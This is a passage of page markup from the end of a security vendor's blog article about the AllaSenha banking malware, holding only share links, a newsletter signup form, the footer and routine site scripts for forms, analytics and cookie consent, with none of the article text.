    <a href="https://www.linkedin.com/sharing/share-offsite?mini=true&url=https://harfanglab.io/insidethelab/allasenha-allakore-variant-azure-c2-steal-banking-latin-america/&title=AllaSenha: AllaKore variant leverages Azure cloud C2 to steal banking details in Latin America" class="sharer btn-share" target="_blank" title="Share on Linkedin">
        <i class="icon-linkedin"></i>
        <span>LinkedIn</span>
    </a>
    <a href="https://reddit.com/submit?url=https://harfanglab.io/insidethelab/allasenha-allakore-variant-azure-c2-steal-banking-latin-america/&title=AllaSenha: AllaKore variant leverages Azure cloud C2 to steal banking details in Latin America" target="_blank" class="sharer btn-share" onclick="window.open(this.href, '', 'menubar=no,toolbar=no,resizable=yes,scrollbars=yes,height=600,width=600');return false;" title="Share on Reddit">
        <i class="icon-reddit"></i>
        <span>Reddit</span>
    </a>
</div>
<article id="newsletter" class="newsletter newsletter-itb">
    <div class="newsletter-wrapper">
        <header class="newsletter-header">
            <strong>Newsletter</strong>
            <h2>Our tech content  <span class="text-gradient">in your mailbox !</span></h2>
        </header>
        <section class="newsletter-body">
            <script type="text/javascript"></script>
                <div class='gf_browser_chrome gform_wrapper gravity-theme gform-theme--no-framework' data-form-theme='gravity-theme' data-form-index='0' id='gform_wrapper_10' ><div id='gf_10' class='gform_anchor' tabindex='-1'></div>
                        <div class='gform_heading'>
							<p class='gform_required_legend'>&quot;<span class="gfield_required gfield_required_asterisk">*</span>&quot; indicates required fields</p>
                        </div><form method='post' enctype='multipart/form-data' target='gform_ajax_frame_10' id='gform_10'  action='/insidethelab/allasenha-allakore-variant-azure-c2-steal-banking-latin-america/#gf_10' data-formid='10' novalidate autocomplete="off">
                        <div class='gform-body gform_body'><div id='gform_fields row_10' class='gform_fields row top_label form_sublabel_above description_below validation_below'><div class="gfield gfield--type-email gfield_contains_required field_sublabel_above gfield--no-description field_description_below field_validation_below gfield_visibility_visible col-12 mb-3"><!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN" "http://www.w3.org/TR/REC-html40/loose.dtd">
<?xml encoding="utf-8" ?><html><body><label class="form-label gfield_label gform-field-label" for="input_10_1">E-mail<span class="gfield_required"><span class="gfield_required gfield_required_asterisk">*</span></span></label><div class="ginput_container ginput_container_email">
                            <input autocomplete="off"  name="input_1" id="input_10_1" type="email" value="" class="form-control-lg form-control" aria-required="true" aria-invalid="false" required="required">
                        </div></body></html>
</div></div></div>
        <div class='gform_footer top_label'> <button type="submit" class="gform_button button btn" id="gform_submit_button_10" value="Sign me up!"><span>Sign me up!<i class="icon icon-arrow-btn"></i></span></button> <input type='hidden' name='gform_ajax' value='form_id=10&amp;title=&amp;description=&amp;tabindex=0&amp;theme=gravity-theme' />
            <input type='hidden' class='gform_hidden' name='is_submit_10' value='1' />
            <input type='hidden' class='gform_hidden' name='gform_submit' value='10' />
            
            <input type='hidden' class='gform_hidden' name='gform_unique_id' value='' />
            <input type='hidden' class='gform_hidden' name='state_10' value='WyJbXSIsIjYyYTI3NDUxNTJiNGZmN2ZmZmUzZjc5NGIwZTcyNDYxIl0=' />
            <input type='hidden' class='gform_hidden' name='gform_target_page_number_10' id='gform_target_page_number_10' value='0' />
            <input type='hidden' class='gform_hidden' name='gform_source_page_number_10' id='gform_source_page_number_10' value='1' />
            <input type='hidden' name='gform_field_values' value='' />
            
        </div>
                        </form>
                        </div>
		                <iframe style='display:none;width:0px;height:0px;' src='about:blank' name='gform_ajax_frame_10' id='gform_ajax_frame_10' title='This iframe contains the logic required to handle Ajax powered Gravity Forms.'></iframe>
		                <script>window.addEventListener('DOMContentLoaded', function() {
gform.initializeOnLoaded( function() {gformInitSpinner( 10, 'data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7', true );jQuery('#gform_ajax_frame_10').on('load',function(){var contents = jQuery(this).contents().find('*').html();var is_postback = contents.indexOf('GF_AJAX_POSTBACK') >= 0;if(!is_postback){return;}var form_content = jQuery(this).contents().find('#gform_wrapper_10');var is_confirmation = jQuery(this).contents().find('#gform_confirmation_wrapper_10').length > 0;var is_redirect = contents.indexOf('gformRedirect(){') >= 0;var is_form = form_content.length > 0 && ! is_redirect && ! is_confirmation;var mt = parseInt(jQuery('html').css('margin-top'), 10) + parseInt(jQuery('body').css('margin-top'), 10) + 100;if(is_form){jQuery('#gform_wrapper_10').html(form_content.html());if(form_content.hasClass('gform_validation_error')){jQuery('#gform_wrapper_10').addClass('gform_validation_error');} else {jQuery('#gform_wrapper_10').removeClass('gform_validation_error');}setTimeout( function() { /* delay the scroll by 50 milliseconds to fix a bug in chrome */ jQuery(document).scrollTop(jQuery('#gform_wrapper_10').offset().top - mt); }, 50 );if(window['gformInitDatepicker']) {gformInitDatepicker();}if(window['gformInitPriceFields']) {gformInitPriceFields();}var current_page = jQuery('#gform_source_page_number_10').val();gformInitSpinner( 10, 'data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7', true );jQuery(document).trigger('gform_page_loaded', [10, current_page]);window['gf_submitting_10'] = false;}else if(!is_redirect){var confirmation_content = jQuery(this).contents().find('.GF_AJAX_POSTBACK').html();if(!confirmation_content){confirmation_content = contents;}jQuery('#gform_wrapper_10').replaceWith(confirmation_content);jQuery(document).scrollTop(jQuery('#gf_10').offset().top - mt);jQuery(document).trigger('gform_confirmation_loaded', [10]);window['gf_submitting_10'] = false;wp.a11y.speak(jQuery('#gform_confirmation_message_10').text());}else{jQuery('#gform_10').append(contents);if(window['gformRedirect']) {gformRedirect();}}jQuery(document).trigger("gform_pre_post_render", [{ formId: "10", currentPage: "current_page", abort: function() { this.preventDefault(); } }]);                if (event && event.defaultPrevented) {                return;         }        const gformWrapperDiv = document.getElementById( "gform_wrapper_10" );        if ( gformWrapperDiv ) {            const visibilitySpan = document.createElement( "span" );            visibilitySpan.id = "gform_visibility_test_10";            gformWrapperDiv.insertAdjacentElement( "afterend", visibilitySpan );        }        const visibilityTestDiv = document.getElementById( "gform_visibility_test_10" );        let postRenderFired = false;                function triggerPostRender() {            if ( postRenderFired ) {                return;            }            postRenderFired = true;            jQuery( document ).trigger( 'gform_post_render', [10, current_page] );            gform.utils.trigger( { event: 'gform/postRender', native: false, data: { formId: 10, currentPage: current_page } } );            if ( visibilityTestDiv ) {                visibilityTestDiv.parentNode.removeChild( visibilityTestDiv );            }        }        function debounce( func, wait, immediate ) {            var timeout;            return function() {                var context = this, args = arguments;                var later = function() {                    timeout = null;                    if ( !immediate ) func.apply( context, args );                };                var callNow = immediate && !timeout;                clearTimeout( timeout );                timeout = setTimeout( later, wait );                if ( callNow ) func.apply( context, args );            };        }        const debouncedTriggerPostRender = debounce( function() {            triggerPostRender();        }, 200 );        if ( visibilityTestDiv && visibilityTestDiv.offsetParent === null ) {            const observer = new MutationObserver( ( mutations ) => {                mutations.forEach( ( mutation ) => {                    if ( mutation.type === 'attributes' && visibilityTestDiv.offsetParent !== null ) {                        debouncedTriggerPostRender();                        observer.disconnect();                    }                });            });            observer.observe( document.body, {                attributes: true,                childList: false,                subtree: true,                attributeFilter: [ 'style', 'class' ],            });        } else {            triggerPostRender();        }    } );} );
});</script>
        </section>
    </div>
        <figure class="newsletter-thumbnail">
        
										<img width="500" height="540" srcset="https://harfanglab.io/medias/2024/02/Insidethelab-purple.svg 1x, https://harfanglab.io/medias/2024/02/Insidethelab-purple.svg 2x"
					class="card-img img-fluid full"
					alt=""
				
					src="https://harfanglab.io/medias/2024/02/Insidethelab-purple.svg"
					sizes="100vw">
						    </figure>
    </article>                    </aside>
                                    </div>
            </div>
        </main>

    </div>
</article>
<!-- /article.single -->



	</main>
	<!-- /main#main-content -->

	<footer id="main-footer">

		<div class="wrapper--widgets">
			<div class="container">
				<section class="footer-part footer-part--widgets" role="complementary" aria-label="Footer widget area">
									<section id="harfanglab_company-2" class="widget footer-widget widget_harfanglab_company"><div class="widget-wrapper">

        <section class="widget-body">
        <figure class="widget-company">
                            <img src="https://harfanglab.io/files/themes/harfangLab/assets/images/svg/logo-harfanglab.svg" alt="HarfangLab | Your endpoints, our protection" class="img-fluid company-logo" width="225" height="65">
                    </figure>
        <div class="description">5, rue Feydeau 75002 Paris <br>
</div>    </section>
    
</div>
</section><section id="nav_menu-2" class="widget footer-widget widget_nav_menu"><div class="menu-menu-footer-widget-anglais-container"><ul id="menu-menu-footer-widget-anglais" class="menu"><li id="menu-item-24701" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-24701"><a href="https://harfanglab.io/about/"><div class="menu-item-wrapper"><span class="menu-item-name">About us</span></div></a></li>
<li id="menu-item-24702" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-24702"><a href="https://harfanglab.io/press/"><div class="menu-item-wrapper"><span class="menu-item-name">Newsroom</span></div></a></li>
</ul></div></section>									<nav class="socials">
    <p>Follow us on :</p>
    <ul>
            <li>
            <a href="https://x.com/harfanglab" class="social --twitter" target="_blank" rel="noreferrer" aria-label="twitter">
                <i class="social-icon-twitter icon-twitter">twitter</i>    
            </a>
        </li>
            <li>
            <a href="https://www.linkedin.com/company/harfanglab" class="social --linkedin" target="_blank" rel="noreferrer" aria-label="linkedin">
                <i class="social-icon-linkedin icon-linkedin">linkedin</i>    
            </a>
        </li>
        </ul>
</nav>
				</section>
			</div>
		</div>
		<div class="wrapper--legals">
			<div class="container">
				<section class="footer-part footer-part--mentions">
					<span class="copyright">Copyright &copy; 2024, All Rights Reserved.</span>
					<ul id="mentions" class="navbar-links">
            <li id="nav-item-24697" class="nav-item">
                            <a href="https://harfanglab.io/legal-notices/" class="nav-link" >
                                        <span>Terms of use</span>
                </a>
                    </li>
            <li id="nav-item-24698" class="nav-item">
                            <a href="https://harfanglab.io/terms-of-use/" class="nav-link" >
                                        <span>General terms and conditions</span>
                </a>
                    </li>
            <li id="nav-item-24699" class="nav-item">
                            <a href="https://harfanglab.io/legal-notices/#cookies" class="nav-link" >
                                        <span>Cookie management</span>
                </a>
                    </li>
            <li id="nav-item-104384" class="nav-item">
                            <a href="https://harfanglab.io/security/" class="nav-link" >
                                        <span>Security</span>
                </a>
                    </li>
    </ul>
				</section>
			</div>
		</div>
	</footer>
	<!-- /footer#main-footer -->

</div>
<!-- /div#main-wrapper -->

    <script>window.addEventListener('DOMContentLoaded', function() {
        jQuery(document).bind('gform_post_render', function(e, formID) {
            if (!jQuery('.gform_validation_errors').length) {
                return;
            }
            const form = document.getElementById('gform_' + formID);
            form.classList.add('was-validated');
        });
    });</script>
<!-- Start of Async HubSpot Analytics Code -->
<script type="rocketlazyloadscript" data-rocket-type="text/javascript">
(function(d,s,i,r) {
if (d.getElementById(i)){return;}
var n=d.createElement(s),e=d.getElementsByTagName(s)[0];
n.id=i;n.src='//js.hs-analytics.net/analytics/'+(Math.ceil(new Date()/r)*r)+'/25847055.js';
e.parentNode.insertBefore(n, e);
})(document,"script","hs-analytics",300000);
</script>
<!-- End of Async HubSpot Analytics Code -->
<script type="rocketlazyloadscript" id="rocket-browser-checker-js-after">
"use strict";var _createClass=function(){function defineProperties(target,props){for(var i=0;i<props.length;i++){var descriptor=props[i];descriptor.enumerable=descriptor.enumerable||!1,descriptor.configurable=!0,"value"in descriptor&&(descriptor.writable=!0),Object.defineProperty(target,descriptor.key,descriptor)}}return function(Constructor,protoProps,staticProps){return protoProps&&defineProperties(Constructor.prototype,protoProps),staticProps&&defineProperties(Constructor,staticProps),Constructor}}();function _classCallCheck(instance,Constructor){if(!(instance instanceof Constructor))throw new TypeError("Cannot call a class as a function")}var RocketBrowserCompatibilityChecker=function(){function RocketBrowserCompatibilityChecker(options){_classCallCheck(this,RocketBrowserCompatibilityChecker),this.passiveSupported=!1,this._checkPassiveOption(this),this.options=!!this.passiveSupported&&options}return _createClass(RocketBrowserCompatibilityChecker,[{key:"_checkPassiveOption",value:function(self){try{var options={get passive(){return!(self.passiveSupported=!0)}};window.addEventListener("test",null,options),window.removeEventListener("test",null,options)}catch(err){self.passiveSupported=!1}}},{key:"initRequestIdleCallback",value:function(){!1 in window&&(window.requestIdleCallback=function(cb){var start=Date.now();return setTimeout(function(){cb({didTimeout:!1,timeRemaining:function(){return Math.max(0,50-(Date.now()-start))}})},1)}),!1 in window&&(window.cancelIdleCallback=function(id){return clearTimeout(id)})}},{key:"isDataSaverModeOn",value:function(){return"connection"in navigator&&!0===navigator.connection.saveData}},{key:"supportsLinkPrefetch",value:function(){var elem=document.createElement("link");return elem.relList&&elem.relList.supports&&elem.relList.supports("prefetch")&&window.IntersectionObserver&&"isIntersecting"in IntersectionObserverEntry.prototype}},{key:"isSlowConnection",value:function(){return"connection"in navigator&&"effectiveType"in navigator.connection&&("2g"===navigator.connection.effectiveType||"slow-2g"===navigator.connection.effectiveType)}}]),RocketBrowserCompatibilityChecker}();
</script>
<script id="rocket-preload-links-js-extra">
var RocketPreloadLinksConfig = {"excludeUris":"\/(?:.+\/)?feed(?:\/(?:.+\/?)?)?$|\/(?:.+\/)?embed\/|\/(index.php\/)?(.*)wp-json(\/.*|$)|\/refer\/|\/go\/|\/recommend\/|\/recommends\/","usesTrailingSlash":"1","imageExt":"jpg|jpeg|gif|png|tiff|bmp|webp|avif|pdf|doc|docx|xls|xlsx|php","fileExt":"jpg|jpeg|gif|png|tiff|bmp|webp|avif|pdf|doc|docx|xls|xlsx|php|html|htm","siteUrl":"https:\/\/harfanglab.io","onHoverDelay":"100","rateThrottle":"3"};
</script>
<script type="rocketlazyloadscript" id="rocket-preload-links-js-after">
(function() {
"use strict";var r="function"==typeof Symbol&&"symbol"==typeof Symbol.iterator?function(e){return typeof e}:function(e){return e&&"function"==typeof Symbol&&e.constructor===Symbol&&e!==Symbol.prototype?"symbol":typeof e},e=function(){function i(e,t){for(var n=0;n<t.length;n++){var i=t[n];i.enumerable=i.enumerable||!1,i.configurable=!0,"value"in i&&(i.writable=!0),Object.defineProperty(e,i.key,i)}}return function(e,t,n){return t&&i(e.prototype,t),n&&i(e,n),e}}();function i(e,t){if(!(e instanceof t))throw new TypeError("Cannot call a class as a function")}var t=function(){function n(e,t){i(this,n),this.browser=e,this.config=t,this.options=this.browser.options,this.prefetched=new Set,this.eventTime=null,this.threshold=1111,this.numOnHover=0}return e(n,[{key:"init",value:function(){!this.browser.supportsLinkPrefetch()||this.browser.isDataSaverModeOn()||this.browser.isSlowConnection()||(this.regex={excludeUris:RegExp(this.config.excludeUris,"i"),images:RegExp(".("+this.config.imageExt+")$","i"),fileExt:RegExp(".("+this.config.fileExt+")$","i")},this._initListeners(this))}},{key:"_initListeners",value:function(e){-1<this.config.onHoverDelay&&document.addEventListener("mouseover",e.listener.bind(e),e.listenerOptions),document.addEventListener("mousedown",e.listener.bind(e),e.listenerOptions),document.addEventListener("touchstart",e.listener.bind(e),e.listenerOptions)}},{key:"listener",value:function(e){var t=e.target.closest("a"),n=this._prepareUrl(t);if(null!==n)switch(e.type){case"mousedown":case"touchstart":this._addPrefetchLink(n);break;case"mouseover":this._earlyPrefetch(t,n,"mouseout")}}},{key:"_earlyPrefetch",value:function(t,e,n){var i=this,r=setTimeout(function(){if(r=null,0===i.numOnHover)setTimeout(function(){return i.numOnHover=0},1e3);else if(i.numOnHover>i.config.rateThrottle)return;i.numOnHover++,i._addPrefetchLink(e)},this.config.onHoverDelay);t.addEventListener(n,function e(){t.removeEventListener(n,e,{passive:!0}),null!==r&&(clearTimeout(r),r=null)},{passive:!0})}},{key:"_addPrefetchLink",value:function(i){return this.prefetched.add(i.href),new Promise(function(e,t){var n=document.createElement("link");n.rel="prefetch",n.href=i.href,n.onload=e,n.onerror=t,document.head.appendChild(n)}).catch(function(){})}},{key:"_prepareUrl",value:function(e){if(null===e||"object"!==(void 0===e?"undefined":r(e))||!1 in e||-1===["http:","https:"].indexOf(e.protocol))return null;var t=e.href.substring(0,this.config.siteUrl.length),n=this._getPathname(e.href,t),i={original:e.href,protocol:e.protocol,origin:t,pathname:n,href:t+n};return this._isLinkOk(i)?i:null}},{key:"_getPathname",value:function(e,t){var n=t?e.substring(this.config.siteUrl.length):e;return n.startsWith("/")||(n="/"+n),this._shouldAddTrailingSlash(n)?n+"/":n}},{key:"_shouldAddTrailingSlash",value:function(e){return this.config.usesTrailingSlash&&!e.endsWith("/")&&!this.regex.fileExt.test(e)}},{key:"_isLinkOk",value:function(e){return null!==e&&"object"===(void 0===e?"undefined":r(e))&&(!this.prefetched.has(e.href)&&e.origin===this.config.siteUrl&&-1===e.href.indexOf("?")&&-1===e.href.indexOf("#")&&!this.regex.excludeUris.test(e.href)&&!this.regex.images.test(e.href))}}],[{key:"run",value:function(){"undefined"!=typeof RocketPreloadLinksConfig&&new n(new RocketBrowserCompatibilityChecker({capture:!0,passive:!0}),RocketPreloadLinksConfig).init()}}]),n}();t.run();
}());
</script>
<script id="harfanglab-pkg-js-extra">
var $_wp = {"ajaxurl":"https:\/\/harfanglab.io\/wp-admin\/admin-ajax.php?wpml_lang=en","current_lang":["en"]};
</script>
<script type="rocketlazyloadscript" data-rocket-src="https://harfanglab.io/files/themes/harfangLab/assets/js/pkg.min.js?ver=1.5.4" id="harfanglab-pkg-js" data-rocket-defer defer></script>
<script type="rocketlazyloadscript" data-rocket-src="https://harfanglab.io/wp-includes/js/dist/dom-ready.min.js?ver=f77871ff7694fffea381" id="wp-dom-ready-js" data-rocket-defer defer></script>
<script type="rocketlazyloadscript" data-rocket-src="https://harfanglab.io/wp-includes/js/dist/hooks.min.js?ver=2810c76e705dd1a53b18" id="wp-hooks-js"></script>
<script type="rocketlazyloadscript" data-rocket-src="https://harfanglab.io/wp-includes/js/dist/i18n.min.js?ver=5e580eb46a90c2b997e6" id="wp-i18n-js"></script>
<script type="rocketlazyloadscript" id="wp-i18n-js-after">
wp.i18n.setLocaleData( { 'text direction\u0004ltr': [ 'ltr' ] } );
</script>
<script type="rocketlazyloadscript" data-rocket-src="https://harfanglab.io/wp-includes/js/dist/a11y.min.js?ver=d90eebea464f6c09bfd5" id="wp-a11y-js" data-rocket-defer defer></script>
<script defer='defer' src="/files/plugins/gravityforms/js/jquery.json.min.js?ver=2.8.17" id="gform_json-js"></script>
<script id="gform_gravityforms-js-extra">
var gform_i18n = {"datepicker":{"days":{"monday":"Mo","tuesday":"Tu","wednesday":"We","thursday":"Th","friday":"Fr","saturday":"Sa","sunday":"Su"},"months":{"january":"January","february":"February","march":"March","april":"April","may":"May","june":"June","july":"July","august":"August","september":"September","october":"October","november":"November","december":"December"},"firstDay":1,"iconText":"Select date"}};
var gf_legacy_multi = [];
var gform_gravityforms = {"strings":{"invalid_file_extension":"This type of file is not allowed. Must be one of the following:","delete_file":"Delete this file","in_progress":"in progress","file_exceeds_limit":"File exceeds size limit","illegal_extension":"This type of file is not allowed.","max_reached":"Maximum number of files reached","unknown_error":"There was a problem while saving the file on the server","currently_uploading":"Please wait for the uploading to complete","cancel":"Cancel","cancel_upload":"Cancel this upload","cancelled":"Cancelled"},"vars":{"images_url":"\/files\/plugins\/gravityforms\/images"}};
var gf_global = {"gf_currency_config":{"name":"Euro","symbol_left":"","symbol_right":"&#8364;","symbol_padding":" ","thousand_separator":".","decimal_separator":",","decimals":2,"code":"EUR"},"base_url":"\/files\/plugins\/gravityforms","number_formats":[],"spinnerUrl":"\/files\/plugins\/gravityforms\/images\/spinner.svg","version_hash":"523413a6fbba0dd581b944eb64c54e66","strings":{"newRowAdded":"New row added.","rowRemoved":"Row removed","formSaved":"The form has been saved.  The content contains the link to return and complete the form."}};
</script>
<script defer='defer' src="/files/plugins/gravityforms/js/gravityforms.min.js?ver=2.8.17" id="gform_gravityforms-js"></script>
<script defer='defer' src="/files/plugins/gravityforms/assets/js/dist/utils.min.js?ver=50c7bea9c2320e16728e44ae9fde5f26" id="gform_gravityforms_utils-js"></script>
<script defer='defer' src="/files/plugins/gravityforms/assets/js/dist/vendor-theme.min.js?ver=54e7080aa7a02c83aa61fae430b9d869" id="gform_gravityforms_theme_vendors-js"></script>
<script id="gform_gravityforms_theme-js-extra">
var gform_theme_config = {"common":{"form":{"honeypot":{"version_hash":"523413a6fbba0dd581b944eb64c54e66"}}},"hmr_dev":"","public_path":"\/files\/plugins\/gravityforms\/assets\/js\/dist\/"};
</script>
<script defer='defer' src="/files/plugins/gravityforms/assets/js/dist/scripts-theme.min.js?ver=bab19fd84843dabc070e73326d787910" id="gform_gravityforms_theme-js"></script>
<script>window.addEventListener('DOMContentLoaded', function() {
gform.initializeOnLoaded( function() { jQuery(document).on('gform_post_render', function(event, formId, currentPage){if(formId == 10) {jQuery( "#gform_10" ).on( 'submit', function( event ) {
	jQuery( '<input>' )
		.attr( 'type', 'hidden' )
		.attr( 'name', 'gf_zero_spam_key' )
		.attr( 'value', 'jBPTBQnMnCKnxqDa1jhRL1gqpst2CpBbB3f2t9XcxfRpAIgypEkrVbZzx0iLnZeb' )
		.attr( 'autocomplete', 'new-password' )
		.appendTo( jQuery( this ) );
} );} } );jQuery(document).on('gform_post_conditional_logic', function(event, formId, fields, isInit){} ) } );
});</script>
<script>window.addEventListener('DOMContentLoaded', function() {
gform.initializeOnLoaded( function() {jQuery(document).trigger("gform_pre_post_render", [{ formId: "10", currentPage: "1", abort: function() { this.preventDefault(); } }]);                if (event && event.defaultPrevented) {                return;         }        const gformWrapperDiv = document.getElementById( "gform_wrapper_10" );        if ( gformWrapperDiv ) {            const visibilitySpan = document.createElement( "span" );            visibilitySpan.id = "gform_visibility_test_10";            gformWrapperDiv.insertAdjacentElement( "afterend", visibilitySpan );        }        const visibilityTestDiv = document.getElementById( "gform_visibility_test_10" );        let postRenderFired = false;                function triggerPostRender() {            if ( postRenderFired ) {                return;            }            postRenderFired = true;            jQuery( document ).trigger( 'gform_post_render', [10, 1] );            gform.utils.trigger( { event: 'gform/postRender', native: false, data: { formId: 10, currentPage: 1 } } );            if ( visibilityTestDiv ) {                visibilityTestDiv.parentNode.removeChild( visibilityTestDiv );            }        }        function debounce( func, wait, immediate ) {            var timeout;            return function() {                var context = this, args = arguments;                var later = function() {                    timeout = null;                    if ( !immediate ) func.apply( context, args );                };                var callNow = immediate && !timeout;                clearTimeout( timeout );                timeout = setTimeout( later, wait );                if ( callNow ) func.apply( context, args );            };        }        const debouncedTriggerPostRender = debounce( function() {            triggerPostRender();        }, 200 );        if ( visibilityTestDiv && visibilityTestDiv.offsetParent === null ) {            const observer = new MutationObserver( ( mutations ) => {                mutations.forEach( ( mutation ) => {                    if ( mutation.type === 'attributes' && visibilityTestDiv.offsetParent !== null ) {                        debouncedTriggerPostRender();                        observer.disconnect();                    }                });            });            observer.observe( document.body, {                attributes: true,                childList: false,                subtree: true,                attributeFilter: [ 'style', 'class' ],            });        } else {            triggerPostRender();        }    } );
});</script>
<script>window.lazyLoadOptions={elements_selector:"iframe[data-lazy-src]",data_src:"lazy-src",data_srcset:"lazy-srcset",data_sizes:"lazy-sizes",class_loading:"lazyloading",class_loaded:"lazyloaded",threshold:300,callback_loaded:function(element){if(element.tagName==="IFRAME"&&element.dataset.rocketLazyload=="fitvidscompatible"){if(element.classList.contains("lazyloaded")){if(typeof window.jQuery!="undefined"){if(jQuery.fn.fitVids){jQuery(element).parent().fitVids()}}}}}};window.addEventListener('LazyLoad::Initialized',function(e){var lazyLoadInstance=e.detail.instance;if(window.MutationObserver){var observer=new MutationObserver(function(mutations){var image_count=0;var iframe_count=0;var rocketlazy_count=0;mutations.forEach(function(mutation){for(var i=0;i<mutation.addedNodes.length;i++){if(typeof mutation.addedNodes[i].getElementsByTagName!=='function'){continue}
if(typeof mutation.addedNodes[i].getElementsByClassName!=='function'){continue}
images=mutation.addedNodes[i].getElementsByTagName('img');is_image=mutation.addedNodes[i].tagName=="IMG";iframes=mutation.addedNodes[i].getElementsByTagName('iframe');is_iframe=mutation.addedNodes[i].tagName=="IFRAME";rocket_lazy=mutation.addedNodes[i].getElementsByClassName('rocket-lazyload');image_count+=images.length;iframe_count+=iframes.length;rocketlazy_count+=rocket_lazy.length;if(is_image){image_count+=1}
if(is_iframe){iframe_count+=1}}});if(image_count>0||iframe_count>0||rocketlazy_count>0){lazyLoadInstance.update()}});var b=document.getElementsByTagName("body")[0];var config={childList:!0,subtree:!0};observer.observe(b,config)}},!1)</script><script data-no-minify="1" async src="/files/plugins/wp-rocket/assets/js/lazyload/17.8.3/lazyload.min.js"></script><script>function lazyLoadThumb(e,alt,l){var t='<img src="https://i.ytimg.com/vi/ID/hqdefault.jpg" alt="" width="480" height="360">',a='<button class="play" aria-label="play Youtube video"></button>';if(l){t=t.replace('data-lazy-','');t=t.replace('loading="lazy"','');t=t.replace(/<noscript>.*?<\/noscript>/g,'');}t=t.replace('alt=""','alt="'+alt+'"');return t.replace("ID",e)+a}function lazyLoadYoutubeIframe(){var e=document.createElement("iframe"),t="ID?autoplay=1";t+=0===this.parentNode.dataset.query.length?"":"&"+this.parentNode.dataset.query;e.setAttribute("src",t.replace("ID",this.parentNode.dataset.src)),e.setAttribute("frameborder","0"),e.setAttribute("allowfullscreen","1"),e.setAttribute("allow","accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture"),this.parentNode.parentNode.replaceChild(e,this.parentNode)}document.addEventListener("DOMContentLoaded",function(){var exclusions=["*.svg","no-lazy"];var e,t,p,u,l,a=document.getElementsByClassName("rll-youtube-player");for(t=0;t<a.length;t++)(e=document.createElement("div")),(u='https://i.ytimg.com/vi/ID/hqdefault.jpg'),(u=u.replace('ID',a[t].dataset.id)),(l=exclusions.some(exclusion=>u.includes(exclusion))),e.setAttribute("data-id",a[t].dataset.id),e.setAttribute("data-query",a[t].dataset.query),e.setAttribute("data-src",a[t].dataset.src),(e.innerHTML=lazyLoadThumb(a[t].dataset.id,a[t].dataset.alt,l)),a[t].appendChild(e),(p=e.querySelector(".play")),(p.onclick=lazyLoadYoutubeIframe)});</script>
	<script type="rocketlazyloadscript" data-rocket-type="text/javascript">window.axeptioSettings = {
      clientId: "651abc3de8845f401f9b0009",
      cookiesVersion: 'harfanglab-en'
};

 
(function(d, s) {
  var t = d.getElementsByTagName(s)[0], e = d.createElement(s);
  e.async = true; e.src = "//static.axept.io/sdk.js";
  t.parentNode.insertBefore(e, t);
})(document, "script");



function launchGA(){
var el = document.createElement('script');
el.setAttribute('type', 'text/javascript');
el.setAttribute('async', true);
el.setAttribute('src', '//www.googletagmanager.com/gtag/js?id=G-WPZQYJHVT1');
document.body.append(el); window.dataLayer = window.dataLayer || [];
function gtag(){dataLayer.push(arguments);}
gtag('js', new Date());
gtag('config', 'G-WPZQYJHVT1', { 'anonymize_ip': true });
gtag('config', 'G-WPZQYJHVT1', {'link_attribution': true});
}


// La fonction qui relie Axeptio au lancement du cookie Google Analytics
void 0 === window._axcb && (window._axcb = []);
window._axcb.push(function(axeptio) {
     axeptio.on("cookies:complete", function(choices) {
    if(choices.google_analytics) {
       launchGA();
      }
     });
});</script>

</body>

</html>

<!-- This website is like a Rocket, isn't it? Performance optimized by WP Rocket. Learn more: https://wp-rocket.me -->